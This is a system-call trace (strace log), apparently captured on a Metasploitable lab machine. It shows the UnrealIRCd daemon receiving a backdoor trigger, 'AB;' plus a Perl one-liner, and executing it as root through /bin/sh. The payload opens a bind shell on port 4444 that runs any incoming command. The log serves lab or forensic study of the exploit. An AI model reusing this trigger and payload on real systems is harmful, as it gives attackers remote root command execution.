4519  07:19:57.841805 select(1024, [2 3 4 7 9], [], NULL, {0, 840000}) = 1 (in [2], left {0, 660000})
4519  07:19:58.025664 clock_gettime(CLOCK_MONOTONIC, {1607, 842689227}) = 0
4519  07:19:58.025693 accept(2, 0, NULL) = 5
4519  07:19:58.025715 getpeername(5, {sa_family=AF_INET, sin_port=htons(33157), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:19:58.025746 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:19:58.025759 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:19:58.025772 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:19:58.025784 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:19:58.025795 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:19:58.025807 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:19:58.025821 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:19:58.025837 clock_gettime(CLOCK_MONOTONIC, {1607, 842850346}) = 0
4519  07:19:58.025849 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:19:58.025861 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:19:58.025870 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:19:58.025880 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:19:58.025890 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:19:58.025906 send(6, "*\206\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:19:58.026059 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:19:58.026097 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n", 70, 0) = 70
4519  07:19:58.026215 gettimeofday({1495624798, 26226}, NULL) = 0
4519  07:19:58.026259 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:19:58.029868 clock_gettime(CLOCK_MONOTONIC, {1607, 846887555}) = 0
4519  07:19:58.029888 recvfrom(6, "*\206\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\251\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:19:58.029930 close(6)          = 0
4519  07:19:58.029945 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:19:58.029960 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 104, 0) = 104
4519  07:19:58.030113 time(NULL)        = 1495624798
4519  07:19:58.030127 time(NULL)        = 1495624798
4519  07:19:58.030144 gettimeofday({1495624798, 30149}, NULL) = 0
4519  07:19:58.030157 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:19:58.030201 clock_gettime(CLOCK_MONOTONIC, {1607, 847214416}) = 0
4519  07:19:58.030212 gettimeofday({1495624798, 30215}, NULL) = 0
4519  07:19:58.030222 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:19:58.030262 clock_gettime(CLOCK_MONOTONIC, {1607, 847274762}) = 0
4519  07:19:58.030273 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:19:58.030302 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:19:58.030322 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:19:58.030334 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:19:58.030349 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 7693
7693  07:19:58.030419 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
7693  07:19:58.030433 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
7693  07:19:58.030444 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7693  07:19:58.030458 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
7693  07:19:58.030572 brk(0)            = 0x80f9000
7693  07:19:58.030623 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7693  07:19:58.030655 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3f000
7693  07:19:58.030671 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
7693  07:19:58.030689 open("/etc/ld.so.cache", O_RDONLY) = 1
7693  07:19:58.030702 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7693  07:19:58.030721 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f37000
7693  07:19:58.030732 close(1)          = 0
7693  07:19:58.030742 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7693  07:19:58.030757 open("/lib/libncurses.so.5", O_RDONLY) = 1
7693  07:19:58.030770 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
7693  07:19:58.030866 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
7693  07:19:58.030883 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f07000
7693  07:19:58.030895 mmap2(0xb7f34000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f34000
7693  07:19:58.030912 close(1)          = 0
7693  07:19:58.030924 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7693  07:19:58.030937 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
7693  07:19:58.030952 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
7693  07:19:58.031042 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
7693  07:19:58.031059 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f03000
7693  07:19:58.031070 mmap2(0xb7f05000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f05000
7693  07:19:58.031112 close(1)          = 0
7693  07:19:58.031142 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7693  07:19:58.031157 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
7693  07:19:58.031171 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
7693  07:19:58.031260 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
7693  07:19:58.031277 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f02000
7693  07:19:58.031290 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db3000
7693  07:19:58.031301 mmap2(0xb7efc000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7efc000
7693  07:19:58.031316 mmap2(0xb7eff000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eff000
7693  07:19:58.031330 close(1)          = 0
7693  07:19:58.031352 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db2000
7693  07:19:58.031364 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7db26b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
7693  07:19:58.031420 mprotect(0xb7efc000, 4096, PROT_READ) = 0
7693  07:19:58.031457 munmap(0xb7f37000, 29913) = 0
7693  07:19:58.031482 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7693  07:19:58.031496 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
7693  07:19:58.031516 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc355f0) = -1 ENOTTY (Inappropriate ioctl for device)
7693  07:19:58.031547 brk(0)            = 0x80f9000
7693  07:19:58.031556 brk(0x80fa000)    = 0x80fa000
7693  07:19:58.031568 brk(0x80fb000)    = 0x80fb000
7693  07:19:58.031611 getuid32()        = 0
7693  07:19:58.031636 getgid32()        = 0
7693  07:19:58.031645 geteuid32()       = 0
7693  07:19:58.031654 getegid32()       = 0
7693  07:19:58.031668 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7693  07:19:58.031682 time(NULL)        = 1495624798
7693  07:19:58.031694 brk(0x80fc000)    = 0x80fc000
7693  07:19:58.031709 brk(0x80fd000)    = 0x80fd000
7693  07:19:58.031728 open("/proc/meminfo", O_RDONLY) = 1
7693  07:19:58.031750 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
7693  07:19:58.031768 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3e000
7693  07:19:58.031779 read(1, "MemTotal:      1035240 kB\nMemFree:        545728 kB\nBuffers:         64940 kB\nCached:         267624 kB\nSwapCached:          0 kB\nActive:         254288 kB\nInactive:       207240 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        545488 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4616 kB\nWriteback:           0 kB\nAnonPages:      128964 kB\nMapped:          51968 kB\nSlab:            16768 kB\nSReclaimable:     8548 kB\nSUnreclaim:       8220 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
7693  07:19:58.031868 close(1)          = 0
7693  07:19:58.031879 munmap(0xb7f3e000, 4096) = 0
7693  07:19:58.031891 brk(0x80fe000)    = 0x80fe000
7693  07:19:58.031917 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
7693  07:19:58.031930 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
7693  07:19:58.031943 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7693  07:19:58.031954 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7693  07:19:58.031966 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
7693  07:19:58.031978 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
7693  07:19:58.031991 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7693  07:19:58.032003 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7693  07:19:58.032016 uname({sys="Linux", node="metasploitable", ...}) = 0
7693  07:19:58.032064 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7693  07:19:58.032126 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7693  07:19:58.032146 brk(0x8100000)    = 0x8100000
7693  07:19:58.032158 getcwd("/etc/unreal", 4096) = 12
7693  07:19:58.032173 getpid()          = 7693
7693  07:19:58.032203 getppid()         = 4519
7693  07:19:58.032219 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7693  07:19:58.032239 stat64("/sbin/sh", 0xbfc355c8) = -1 ENOENT (No such file or directory)
7693  07:19:58.032251 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
7693  07:19:58.032269 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
7693  07:19:58.032293 socket(PF_FILE, SOCK_STREAM, 0) = 1
7693  07:19:58.032306 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
7693  07:19:58.032318 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
7693  07:19:58.032339 close(1)          = 0
7693  07:19:58.032350 socket(PF_FILE, SOCK_STREAM, 0) = 1
7693  07:19:58.032360 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
7693  07:19:58.032370 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
7693  07:19:58.032389 close(1)          = 0
7693  07:19:58.032402 open("/etc/nsswitch.conf", O_RDONLY) = 1
7693  07:19:58.032416 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
7693  07:19:58.032433 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3e000
7693  07:19:58.032444 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
7693  07:19:58.032493 read(1, "", 4096) = 0
7693  07:19:58.032503 close(1)          = 0
7693  07:19:58.032512 munmap(0xb7f3e000, 4096) = 0
7693  07:19:58.032528 open("/etc/ld.so.cache", O_RDONLY) = 1
7693  07:19:58.032541 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7693  07:19:58.032557 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f37000
7693  07:19:58.032567 close(1)          = 0
7693  07:19:58.032620 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7693  07:19:58.032637 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
7693  07:19:58.032652 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
7693  07:19:58.032760 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
7693  07:19:58.032777 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7da9000
7693  07:19:58.032789 mmap2(0xb7db0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7db0000
7693  07:19:58.032806 close(1)          = 0
7693  07:19:58.032818 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7693  07:19:58.032831 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
7693  07:19:58.032846 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
7693  07:19:58.032933 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
7693  07:19:58.032950 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d91000
7693  07:19:58.032961 mmap2(0xb7da5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7da5000
7693  07:19:58.032976 mmap2(0xb7da7000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7da7000
7693  07:19:58.032990 close(1)          = 0
7693  07:19:58.033016 munmap(0xb7f37000, 29913) = 0
7693  07:19:58.033033 open("/etc/ld.so.cache", O_RDONLY) = 1
7693  07:19:58.033045 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7693  07:19:58.033061 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f37000
7693  07:19:58.033103 close(1)          = 0
7693  07:19:58.033129 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7693  07:19:58.033144 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
7693  07:19:58.033158 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7693  07:19:58.033252 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
7693  07:19:58.033269 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d87000
7693  07:19:58.033281 mmap2(0xb7d8f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d8f000
7693  07:19:58.033297 close(1)          = 0
7693  07:19:58.033310 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
